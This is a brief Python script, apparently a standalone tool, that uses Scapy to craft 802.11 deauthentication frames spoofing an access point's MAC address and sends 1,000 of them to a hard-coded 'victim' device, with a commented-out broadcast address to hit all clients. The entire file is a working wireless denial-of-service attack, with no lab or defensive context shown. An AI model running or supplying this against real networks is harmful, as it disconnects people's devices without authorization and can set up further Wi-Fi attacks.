from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import sys

iface = "wlan0"  # Your monitor mode interface
target_mac = "0c:7a:15:51:7a:89"  # Victim device MAC
# target_mac = 'ff:ff:ff:ff:ff:ff'
ap_mac = "9e:56:cc:5d:38:ba"  # Access point MAC

# Craft deauth packet
def deauth_packet():
    return RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)

# Send packets in loop
print(f"[+] Sending deauth packets to {target_mac} from {ap_mac}")
sendp(deauth_packet(), iface=iface, count=1000, inter=0.1, verbose=1)
